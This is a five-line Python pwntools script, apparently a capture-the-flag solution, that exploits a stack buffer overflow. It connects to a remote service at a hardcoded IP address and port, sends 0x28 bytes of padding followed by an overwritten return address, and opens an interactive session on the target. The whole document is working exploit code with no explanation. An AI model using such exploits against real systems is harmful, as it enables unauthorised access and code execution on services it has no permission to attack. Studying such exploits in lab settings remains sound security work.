from pwn import*
p = process('./main')
p = remote('39.101.210.214',10002)
p.sendafter("?",'U'*0x28 + p64(0x401162))
p.interactive()
